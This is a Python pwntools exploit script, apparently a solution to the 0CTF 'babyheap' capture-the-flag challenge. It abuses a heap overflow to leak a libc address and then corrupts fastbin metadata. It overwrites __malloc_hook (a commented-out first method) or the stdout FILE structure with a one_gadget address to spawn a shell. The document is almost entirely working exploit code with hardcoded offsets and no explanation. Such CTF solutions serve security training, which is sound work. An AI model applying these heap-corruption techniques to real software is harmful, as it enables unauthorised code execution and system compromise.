from pwn import *
s = process("./0ctfbabyheap")
raw_input("debug ")
sla = lambda delim,data : s.sendlineafter(delim,str(data))

one_gadget = [0x45226,0x4527a,0xf0364,0xf1207]

def alloc(size):
    sla("Command: ",1)
    sla("Size: ",size)
    log.info("alloc "+str(size))
def fill(index,size,content):
    sla("Command: ",2)
    sla("Index: ",index)
    sla("Size: ",size)
    sla("Content: ",content)
def free(index):
    sla("Command: ",3)
    sla("Index: ",index)
    log.info("free " + str(1))
def dump(index):
    sla("Command: ",4)
    sla("Index: ",index)

def exit():
    sla("Command: ",5)
alloc(0x20) #0
alloc(0x80) #1
alloc(0x20) #2
free(1)
payload = 'a'*0x28 + p64(0x93)
fill(0,0x30,payload)
alloc(0x80) #1
dump(1)
s.recvuntil("Content: \n")
av_top = u64(s.recv(6) + "\x00"*2)
log.info('av_top: 0x%x'%av_top)
libc_base = av_top - 0x3c4b78 
log.info('libc_base: 0x%x'%libc_base)
malloc_hook = libc_base+0x3c4b10
log.info('malloc_hook: 0x%x'%malloc_hook)
# =========== method 1 : malloc_hook overwrite =============
# alloc(0x68) #3
# free(3)
# payload = p64(0x71)*6+p64(malloc_hook-35)
# fill(2,0x38,payload) # overflow 2 to overwrite the FD of 3 -> malloc_hook-35
# alloc(0x68) #3
# alloc(0x68) #4
# fill(4,19+8,'a'*19 + p64(libc_base+one_gadget[1]))
# alloc(0x10)

# ============ method 2: stdout overwrite =============== 
alloc(0x68)
free(3)
IO_2_1_stdout = 0x7ffff7dd2620+157
payload = p64(0x71)*6+p64(IO_2_1_stdout)
fill(2,0x38,payload)
alloc(0x68) #3
alloc(0x68) #4
payload2 = p64(0x0)*2
payload2 += p64(0xffffffff000000)

payload2 += "\x00\x00\x00"
payload2 += p64(0x0)
payload2 += p64(libc_base+one_gadget[3])
payload2 += p64(0x7ffff7dd2620+216-8-0x38)
fill(4,51,payload2)  # -> call shell if call puts, printf, ...

s.interactive()
s.close()